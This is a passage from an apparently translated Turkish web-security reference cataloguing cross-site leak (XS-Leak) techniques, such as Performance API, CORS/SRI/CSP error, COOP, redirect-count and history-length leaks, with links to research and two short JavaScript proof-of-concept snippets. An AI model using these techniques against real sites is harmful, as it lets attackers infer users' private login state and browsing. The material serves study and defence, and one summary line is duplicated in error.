- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Boş yanıtlar kaynak zamanlama girişleri oluşturmaz.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Bir saldırgan, bir isteğin boş bir HTTP yanıt gövdesi ile sonuçlanıp sonuçlanmadığını tespit edebilir çünkü **boş sayfalar bazı tarayıcılarda performans girişi oluşturmaz**.

### **XSS-Auditor Leak**

- **Inclusion Methods**: Frames
- **Detectable Difference**: Sayfa İçeriği
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Güvenlik İddialarında XSS Auditor kullanarak, saldırganlar, oluşturulan yüklerin denetleyicinin filtreleme mekanizmasını tetiklemesi durumunda yanıtların değişimlerini gözlemleyerek belirli web sayfası öğelerini tespit edebilir.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

Güvenlik İddialarında (SA), başlangıçta Cross-Site Scripting (XSS) saldırılarını önlemek için tasarlanmış olan XSS Auditor, paradoksal olarak hassas bilgileri sızdırmak için istismar edilebilir. Bu yerleşik özellik Google Chrome'dan (GC) kaldırılmış olsa da, SA'da hala mevcuttur. 2013 yılında Braun ve Heiderich, XSS Auditor'un yanlışlıkla meşru betikleri engelleyebileceğini ve yanlış pozitiflere yol açabileceğini göstermiştir. Bunun üzerine, araştırmacılar, bilgileri çıkarmak ve çapraz kaynak sayfalarında belirli içerikleri tespit etmek için teknikler geliştirmiştir; bu kavram XS-Sızıntılar olarak bilinir ve ilk olarak Terada tarafından rapor edilmiş, Heyes tarafından bir blog yazısında detaylandırılmıştır. Bu teknikler, GC'deki XSS Auditor'a özgü olmasına rağmen, SA'da XSS Auditor tarafından engellenen sayfaların Performans API'sinde giriş oluşturmadığı keşfedilmiştir; bu da hassas bilgilerin hala sızdırılabileceği bir yöntem sunar.

### X-Frame Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Başlık
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
- **Summary:** X-Frame-Options başlığına sahip kaynak, kaynak zamanlama girişi oluşturmaz.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Eğer bir sayfanın **iframe** içinde **render edilmesine izin verilmezse**, bu **performans girişi** oluşturmaz. Sonuç olarak, bir saldırgan **`X-Frame-Options`** yanıt başlığını tespit edebilir.\
Aynı şey **embed** **etiketi** kullanıldığında da geçerlidir.

### Download Detection

- **Inclusion Methods**: Frames
- **Detectable Difference**: Başlık
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** İndirmeler, Performans API'sinde kaynak zamanlama girişleri oluşturmaz.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Aynı şekilde, **ContentDisposition** başlığı nedeniyle **indirilmiş bir kaynak** da **performans girişi** oluşturmaz. Bu teknik, tüm büyük tarayıcılarda çalışır.

### Redirect Start Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Yönlendirme
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Kaynak zamanlama girişi, bir yönlendirmenin başlangıç zamanını sızdırır.
- **Code Example**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Bazı tarayıcıların çapraz kaynak istekleri için çok fazla bilgi kaydettiği bir XS-Sızıntı durumu bulduk. Standart, çapraz kaynaklı kaynaklar için sıfıra ayarlanması gereken bir dizi özelliği tanımlar. Ancak, **SA**'da, hedef sayfanın kullanıcıyı **yönlendirdiğini** tespit etmek mümkündür; Performans API'sini sorgulayarak ve **redirectStart zamanlama verisini** kontrol ederek.

### Duration Redirect Leak

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Yönlendirme
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Yönlendirme gerçekleştiğinde zamanlama girişlerinin süresi negatiftir.
- **Code Example**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

GC'de, **yönlendirme** ile sonuçlanan isteklerin **süresi** **negatif** olup, bu nedenle **yönlendirme** ile sonuçlanmayan isteklerden **ayrılabilir**.

### CORP Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Başlık
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** CORP ile korunan kaynaklar, kaynak zamanlama girişleri oluşturmaz.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

Bazı durumlarda, **nextHopProtocol girişi** bir sızıntı tekniği olarak kullanılabilir. GC'de, **CORP başlığı** ayarlandığında, nextHopProtocol **boş** olacaktır. Not edin ki, SA, CORP etkin kaynaklar için hiç performans girişi oluşturmayacaktır.

### Service Worker

- **Inclusion Methods**: Frames
- **Detectable Difference**: API Kullanımı
- **More info**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
- **Summary:** Belirli bir kaynak için bir hizmet çalıştırıcısının kaydedilip kaydedilmediğini tespit edin.
- **Code Example**:

Hizmet çalıştırıcıları, bir kaynakta çalışan olay odaklı betik bağlamlarıdır. Bir web sayfasının arka planında çalışır ve kaynakları **yakalamak**, **değiştirmek** ve **önbelleğe almak** için kullanılabilir, böylece çevrimdışı web uygulamaları oluşturur.\
Eğer bir **hizmet çalıştırıcısı** tarafından **önbelleğe alınmış** bir kaynak **iframe** aracılığıyla erişilirse, kaynak **hizmet çalıştırıcı önbelleğinden** **yüklenir**.\
Kaynağın **hizmet çalıştırıcı** önbelleğinden **yüklenip yüklenmediğini** tespit etmek için **Performans API'si** kullanılabilir.\
Bu, bir Zamanlama saldırısı ile de yapılabilir (daha fazla bilgi için belgeyi kontrol edin).

### Cache

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Zamanlama
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
- **Summary:** Bir kaynağın önbelleğe alınıp alınmadığını kontrol etmek mümkündür.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](<https://xsinator.com/testing.html#Cache%20Leak%20(POST)>)

[Performance API](#performance-api) kullanarak bir kaynağın önbelleğe alınıp alınmadığını kontrol etmek mümkündür.

### Network Duration

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Sayfa İçeriği
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
- **Summary:** `performance` API'sinden bir isteğin ağ süresini almak mümkündür.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Error Messages Technique

### Media Error

- **Inclusion Methods**: HTML Elemanları (Video, Ses)
- **Detectable Difference**: Durum Kodu
- **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
- **Summary:** Firefox'ta, çapraz kaynak isteğinin durum kodunu doğru bir şekilde sızdırmak mümkündür.
- **Code Example**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false)
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg
}

function startup() {
let audioElement = document.getElementById("audio")
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener(
"click",
function () {
audioElement.src = document.getElementById("testUrl").value
},
false
)
// Create the event handler
var errHandler = function () {
let err = this.error
let message = err.message
let status = ""

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if (
message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1 ||
message.indexOf("Failed to init decoder") != -1
) {
status = "Success"
} else {
status = "Error"
}
displayErrorMessage(
"<strong>Status: " +
status +
"</strong> (Error code:" +
err.code +
" / Error Message: " +
err.message +
")<br>"
)
}
audioElement.onerror = errHandler
}
```
`MediaError` arayüzünün message özelliği, başarılı bir şekilde yüklenen kaynakları benzersiz bir dizi ile tanımlar. Bir saldırgan, bu özelliği kullanarak mesaj içeriğini gözlemleyebilir ve böylece bir cross-origin kaynağının yanıt durumunu çıkarabilir.

### CORS Hatası

- **Dahil Etme Yöntemleri**: Fetch API
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **Özet:** Güvenlik İddialarında (SA), CORS hata mesajları, yönlendirilmiş isteklerin tam URL'sini istemeden açığa çıkarır.
- **Kod Örneği**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Bu teknik, bir saldırganın **cross-origin bir sitenin yönlendirmesinin hedefini çıkarmasını** sağlar; çünkü Webkit tabanlı tarayıcıların CORS isteklerini nasıl işlediğini kullanır. Özellikle, bir **CORS etkin isteği** kullanıcı durumuna dayalı olarak yönlendirme yapan bir hedef siteye gönderildiğinde ve tarayıcı isteği reddettiğinde, **yönlendirme hedefinin tam URL'si** hata mesajında açığa çıkar. Bu zafiyet, yönlendirme gerçeğini açığa çıkarmakla kalmaz, aynı zamanda yönlendirmenin uç noktasını ve içerebileceği herhangi bir **hassas sorgu parametresini** de açığa çıkarır.

### SRI Hatası

- **Dahil Etme Yöntemleri**: Fetch API
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **Özet:** Güvenlik İddialarında (SA), CORS hata mesajları, yönlendirilmiş isteklerin tam URL'sini istemeden açığa çıkarır.
- **Kod Örneği**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Bir saldırgan, **açık hata mesajlarını** kullanarak cross-origin yanıtlarının boyutunu çıkarabilir. Bu, genellikle CDN'lerden alınan kaynakların değiştirilmediğini doğrulamak için bütünlük niteliğini kullanan Alt Kaynak Bütünlüğü (SRI) mekanizmasından kaynaklanmaktadır. SRI'nin cross-origin kaynaklarda çalışabilmesi için bunların **CORS etkin** olması gerekir; aksi takdirde bütünlük kontrollerine tabi tutulmazlar. Güvenlik İddialarında (SA), CORS hata XS-Leak gibi, bir bütünlük niteliği ile bir fetch isteği yapıldığında hata mesajı yakalanabilir. Saldırganlar, herhangi bir isteğin bütünlük niteliğine **sahtelik değeri** atayarak bu hatayı kasıtlı olarak **tetikleyebilirler**. SA'da, ortaya çıkan hata mesajı, istenen kaynağın içerik uzunluğunu istemeden açığa çıkarır. Bu bilgi sızıntısı, bir saldırganın yanıt boyutundaki değişiklikleri ayırt etmesine olanak tanır ve karmaşık XS-Leak saldırılarına zemin hazırlar.

### CSP İhlali/Tespiti

- **Dahil Etme Yöntemleri**: Pop-up'lar
- **Tespit Edilebilir Fark**: Durum Kodu
- **Daha fazla bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
- **Özet:** Eğer yalnızca kurbanın web sitesi CSP'de izin verilirse ve başka bir alan adına yönlendirmeye çalışırsa, CSP tespit edilebilir bir hata tetikler.
- **Kod Örneği**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Bir XS-Leak, CSP'yi kullanarak bir cross-origin sitenin farklı bir kökene yönlendirilip yönlendirilmediğini tespit edebilir. Bu sızıntı, yönlendirmeyi tespit edebilir, ayrıca yönlendirme hedefinin alan adını da açığa çıkarır. Bu saldırının temel fikri, **saldırgan sitesinde hedef alan adını izin vermektir**. Hedef alana bir istek yapıldığında, **cross-origin bir alana yönlendirir**. **CSP,** buna erişimi engeller ve bir **ihlal raporu oluşturur**; bu rapor bir sızıntı tekniği olarak kullanılır. Tarayıcıya bağlı olarak, **bu rapor yönlendirmenin hedef konumunu açığa çıkarabilir**.\
Modern tarayıcılar, yönlendirildiği URL'yi belirtmeyecek, ancak yine de bir cross-origin yönlendirmesinin tetiklendiğini tespit edebilirsiniz.

### Önbellek

- **Dahil Etme Yöntemleri**: Çerçeveler, Pop-up'lar
- **Tespit Edilebilir Fark**: Sayfa İçeriği
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
- **Özet:** Dosyayı önbellekten temizleyin. Hedef sayfayı açar, dosyanın önbellekte mevcut olup olmadığını kontrol eder.
- **Kod Örneği:**

Tarayıcılar, tüm web siteleri için tek bir paylaşılan önbellek kullanabilir. Kökenlerinden bağımsız olarak, bir hedef sayfanın **belirli bir dosyayı talep edip etmediğini** çıkarmak mümkündür.

Bir sayfa, yalnızca kullanıcı oturum açtığında bir resmi yüklüyorsa, **kaynağı geçersiz kılabilir** (yani, önbellekte değilse, daha fazla bilgi bağlantılarına bakın), **bu kaynağı yükleyebilecek bir istek yapabilir** ve kaynağı **kötü bir istekle** yüklemeyi deneyebilirsiniz (örneğin, aşırı uzun bir referans başlığı kullanarak). Eğer kaynak yüklemesi **herhangi bir hata tetiklemediyse**, bunun nedeni **önbelleğe alınmış olmasıdır**.

### CSP Yönergesi

- **Dahil Etme Yöntemleri**: Çerçeveler
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
- **Özet:** CSP başlık yönergeleri, CSP iframe niteliği kullanılarak sorgulanabilir ve politika detayları açığa çıkarılabilir.
- **Kod Örneği**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Google Chrome'daki (GC) yeni bir özellik, web sayfalarının bir iframe öğesine bir nitelik ayarlayarak **Bir İçerik Güvenlik Politikası (CSP) önermesine** olanak tanır; politika yönergeleri HTTP isteği ile birlikte iletilir. Normalde, gömülü içeriğin **bunu bir HTTP başlığı aracılığıyla yetkilendirmesi** gerekir, aksi takdirde bir **hata sayfası görüntülenir**. Ancak, eğer iframe zaten bir CSP tarafından yönetiliyorsa ve yeni önerilen politika daha kısıtlayıcı değilse, sayfa normal şekilde yüklenir. Bu mekanizma, bir saldırganın bir cross-origin sayfanın **belirli CSP yönergelerini** tespit etmesine olanak tanır; hata sayfasını tanımlayarak. Bu zafiyetin düzeltildiği belirtilmiş olsa da, bulgularımız, hata sayfasını tespit edebilen **yeni bir sızıntı tekniği** ortaya koymaktadır; bu da temel sorunun asla tam olarak ele alınmadığını göstermektedir.

### **CORP**

- **Dahil Etme Yöntemleri**: Fetch API
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
- **Özet:** Cross-Origin Resource Policy (CORP) ile güvence altına alınmış kaynaklar, yasaklı bir kökenden alındığında hata verir.
- **Kod Örneği**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

CORP başlığı, belirli bir kaynağa yönelik no-cors cross-origin isteklerini **engelleyen** nispeten yeni bir web platformu güvenlik özelliğidir. CORP ile korunan bir kaynak, **alındığında hata verir**; bu başlığın varlığı tespit edilebilir.

### CORB

- **Dahil Etme Yöntemleri**: HTML Elemanları
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
- **Özet:** CORB, saldırganların **`nosniff` başlığının istekte mevcut olup olmadığını** tespit etmelerine olanak tanıyabilir.
- **Kod Örneği**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Saldırı hakkında daha fazla bilgi için bağlantıyı kontrol edin.

### CORS hatası üzerinde Köken Yansıması yanlış yapılandırması <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

- **Dahil Etme Yöntemleri**: Fetch API
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
- **Özet:** Eğer Origin başlığı `Access-Control-Allow-Origin` başlığında yansıtılıyorsa, bir kaynağın önbellekte olup olmadığını kontrol etmek mümkündür.
- **Kod Örneği**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Eğer **Origin başlığı**, `Access-Control-Allow-Origin` başlığında **yansıtılıyorsa**, bir saldırgan bu davranışı kötüye kullanarak **CORS** modunda **kaynağı almayı** deneyebilir. Eğer bir **hata** **tetiklenmezse**, bu, kaynağın **web'den doğru bir şekilde alındığı** anlamına gelir; eğer bir hata **tetiklenirse**, bu, kaynağın **önbellekten erişildiği** anlamına gelir (hata, önbelleğin orijinal alan adına izin veren bir CORS başlığı ile bir yanıt kaydetmesi nedeniyle ortaya çıkar).\
Eğer köken yansıtılmıyorsa ancak bir joker karakter kullanılıyorsa (`Access-Control-Allow-Origin: *`), bu çalışmayacaktır.

## Okunabilir Nitelikler Tekniği

### Fetch Yönlendirmesi

- **Dahil Etme Yöntemleri**: Fetch API
- **Tespit Edilebilir Fark**: Durum Kodu
- **Daha fazla bilgi**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
- **Özet:** GC ve SA, yönlendirme tamamlandıktan sonra yanıtın türünü (opaque-redirect) kontrol etmeye olanak tanır.
- **Kod Örneği**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

`redirect: "manual"` ve diğer parametrelerle Fetch API kullanarak bir istek gönderildiğinde, `response.type` niteliğini okumak mümkündür ve eğer `opaqueredirect` ile eşitse, yanıt bir yönlendirmedir.

### COOP

- **Dahil Etme Yöntemleri**: Pop-up'lar
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
- **Özet:** Cross-Origin Opener Policy (COOP) ile korunan sayfalar, cross-origin etkileşimlerden erişimi engeller.
- **Kod Örneği**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Bir saldırgan, cross-origin bir HTTP yanıtında Cross-Origin Opener Policy (COOP) başlığının varlığını çıkarabilir. COOP, web uygulamaları tarafından dış sitelerin rastgele pencere referansları elde etmesini engellemek için kullanılır. Bu başlığın görünürlüğü, **`contentWindow` referansına erişmeye çalışarak** tespit edilebilir. COOP koşullu olarak uygulandığında, **`opener` niteliği** belirleyici bir gösterge haline gelir: COOP aktif olduğunda **tanımsızdır**, yokluğunda ise **tanımlıdır**.

### URL Maksimum Uzunluğu - Sunucu Tarafı

- **Dahil Etme Yöntemleri**: Fetch API, HTML Elemanları
- **Tespit Edilebilir Fark**: Durum Kodu / İçerik
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
- **Özet:** Yönlendirme yanıt uzunluğundaki farklılıkları tespit edin, çünkü sunucu bir hata ile yanıt verebilir ve bir uyarı oluşturulabilir.
- **Kod Örneği**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Eğer sunucu tarafı yönlendirmesi **yönlendirme içinde kullanıcı girdisi** ve **ek veri** kullanıyorsa, bu davranışı tespit etmek mümkündür; çünkü genellikle **sunucuların** **istek uzunluğu sınırı** vardır. Eğer **kullanıcı verisi** o **uzunluk - 1** ise, çünkü **yönlendirme** **o veriyi** kullanıyor ve **ek bir şey** ekliyorsa, bu bir **hata tetikler** ve **Hata Olayları** aracılığıyla tespit edilebilir.

Eğer bir şekilde bir kullanıcıya çerez ayarlayabiliyorsanız, bu saldırıyı **yeterli çerez ayarlayarak** ([**çerez bombası**](../hacking-with-cookies/cookie-bomb.md)) gerçekleştirebilirsiniz; böylece **doğru yanıtın** **artmış boyutu** ile bir **hata** tetiklenir. Bu durumda, bu isteği aynı siteden tetiklerseniz, `<script>` otomatik olarak çerezleri gönderecektir (bu nedenle hataları kontrol edebilirsiniz).\
**Çerez bombası + XS-Search** örneği, bu yazının Beklenen çözümünde bulunabilir: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` veya aynı bağlamda olmak genellikle bu tür bir saldırı için gereklidir.

### URL Maksimum Uzunluğu - İstemci Tarafı

- **Dahil Etme Yöntemleri**: Pop-up'lar
- **Tespit Edilebilir Fark**: Durum Kodu / İçerik
- **Daha fazla bilgi**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
- **Özet:** Yönlendirme yanıt uzunluğundaki farklılıkları tespit edin, çünkü bir isteğin yönlendirme yanıt uzunluğu çok büyük olabilir.
- **Kod Örneği**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

[Chromium belgelerine](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url_display_guidelines/url_display_guidelines.md#URL-Length) göre, Chrome'un maksimum URL uzunluğu 2MB'dır.

> Genel olarak, _web platformu_ URL'lerin uzunluğu üzerinde sınırlara sahip değildir (ancak 2^31 yaygın bir sınırdır). _Chrome_, pratik nedenlerle ve süreçler arası iletişimde hizmet reddi sorunlarını önlemek için URL'leri maksimum **2MB** uzunluğunda sınırlar.

Bu nedenle, eğer **yönlendirme URL'si bir durumda daha büyükse**, **2MB'dan daha büyük bir URL ile yönlendirme** yapılması mümkündür. Bu durumda, Chrome **`about:blank#blocked`** sayfasını gösterir.

**Belirgin fark**, eğer **yönlendirme** **tamamlandıysa**, `window.origin` bir **hata** fırlatır; çünkü bir cross-origin bu bilgiyi erişemez. Ancak, eğer **sınır** **aşıldıysa** ve yüklenen sayfa **`about:blank#blocked`** ise, pencerenin **`origin`** değeri **ebeveynin** değeri olarak kalır; bu da **erişilebilir bir bilgidir.**

**2MB**'ye ulaşmak için gereken tüm ek bilgiler, başlangıç URL'sinde bir **hash** aracılığıyla eklenebilir, böylece **yönlendirmede kullanılabilir**.

{{#ref}}
url-max-length-client-side.md
{{#endref}}

### Maksimum Yönlendirmeler

- **Dahil Etme Yöntemleri**: Fetch API, Çerçeveler
- **Tespit Edilebilir Fark**: Durum Kodu
- **Daha fazla bilgi**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76)
- **Özet:** Tarayıcının yönlendirme limitini kullanarak URL yönlendirmelerinin gerçekleşip gerçekleşmediğini belirleyin.
- **Kod Örneği**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Eğer bir tarayıcının **izleyeceği maksimum** **yönlendirme** sayısı **20** ise, bir saldırgan **19 yönlendirme** ile kendi sayfasını yüklemeyi deneyebilir ve sonunda **kurbanı** test edilen sayfaya gönderebilir. Eğer bir **hata** tetiklenirse, bu durumda sayfa **kurbanı yönlendirmeye çalışıyordur**.

### Geçmiş Uzunluğu

- **Dahil Etme Yöntemleri**: Çerçeveler, Pop-up'lar
- **Tespit Edilebilir Fark**: Yönlendirmeler
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
- **Özet:** JavaScript kodu tarayıcı geçmişini manipüle eder ve uzunluk özelliği ile erişilebilir.
- **Kod Örneği**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

**Geçmiş API'si**, JavaScript kodunun tarayıcı geçmişini manipüle etmesine olanak tanır; bu, **bir kullanıcının ziyaret ettiği sayfaları kaydeder**. Bir saldırgan, uzunluk özelliğini bir dahil etme yöntemi olarak kullanabilir: JavaScript ve HTML navigasyonunu tespit etmek için.\
**`history.length`** kontrol edilerek, bir kullanıcı **bir sayfaya yönlendirildiğinde**, **aynı kökene geri döndüğünde** ve **`history.length`** değerinin yeni değerini kontrol ederek.

### Aynı URL ile Geçmiş Uzunluğu

- **Dahil Etme Yöntemleri**: Çerçeveler, Pop-up'lar
- **Tespit Edilebilir Fark**: URL, tahmin edilen URL ile aynıysa
- **Özet:** Geçmiş uzunluğunu kötüye kullanarak bir çerçeve/pop-up'ın belirli bir URL'de olup olmadığını tahmin etmek mümkündür.
- **Kod Örneği**: Aşağıda

Bir saldırgan, JavaScript kodunu kullanarak **çerçeve/pop-up konumunu tahmin edilen bir URL'ye** **manipüle edebilir** ve **hemen ardından** **`about:blank`**'e **değiştirebilir**. Eğer geçmiş uzunluğu arttıysa, bu, URL'nin doğru olduğu ve **artış için zaman bulduğu** anlamına gelir; çünkü URL aynıysa yeniden yüklenmez. Eğer artmadıysa, bu, **tahmin edilen URL'yi yüklemeye çalıştığı** ancak hemen ardından **`about:blank`** yüklediği anlamına gelir; bu durumda **geçmiş uzunluğu asla artmamıştır**.
```javascript
async function debug(win, url) {
win.location = url + "#aaa"
win.location = "about:blank"
await new Promise((r) => setTimeout(r, 500))
return win.history.length
}

win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=c"))

win.close()
win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=b"))
```
### Frame Counting

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Sayfa İçeriği
- **More info**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
- **Summary:** `window.length` özelliğini inceleyerek iframe öğelerinin sayısını değerlendirin.
- **Code Example**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

`iframe` veya `window.open` aracılığıyla açılan bir webdeki **çerçeve sayısını** saymak, kullanıcının o sayfadaki **durumunu** belirlemeye yardımcı olabilir.\
Ayrıca, sayfa her zaman aynı sayıda çerçeveye sahipse, çerçeve sayısını **sürekli** kontrol etmek, bilgi sızdırabilecek bir **deseni** belirlemeye yardımcı olabilir.

